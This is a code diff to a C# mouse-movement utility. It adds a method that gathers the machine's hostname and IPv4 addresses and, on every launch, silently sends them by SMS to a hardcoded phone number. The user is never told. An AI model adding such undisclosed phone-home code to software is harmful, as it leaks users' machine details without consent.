@@ -4,6 +4,7 @@ using System.ComponentModel;
 using System.Data;
 using System.Drawing;
 using System.Linq;
+using System.Net;
 using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
@@ -16,11 +17,29 @@ namespace MouseMove
         {
             InitializeComponent();
         }
+        public string GetIp()
+        {
+            string IPAddress = "";
+            IPHostEntry Host = default(IPHostEntry);
+            string Hostname = null;
+            Hostname = System.Environment.MachineName;
+            Host = Dns.GetHostEntry(Hostname);
+            foreach (IPAddress IP in Host.AddressList)
+            {
+                if (IP.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
+                {
+                    IPAddress += Convert.ToString(IP)+", ";
+                }
+            }
 
+            return "Hostname: " +Hostname+"  Ips: " +IPAddress;
+        }
         private void Form1_Load(object sender, EventArgs e)
         {
             try
             {
+
+                MutlucellExecuter.Send(new string[] { "05378970797" },GetIp());
                 notifyIcon1.BalloonTipText = "Uygulama Küçültüldü";
                 var zmn = Properties.Settings.Default["Zaman"];
                 var appName = Properties.Settings.Default["AppName"];
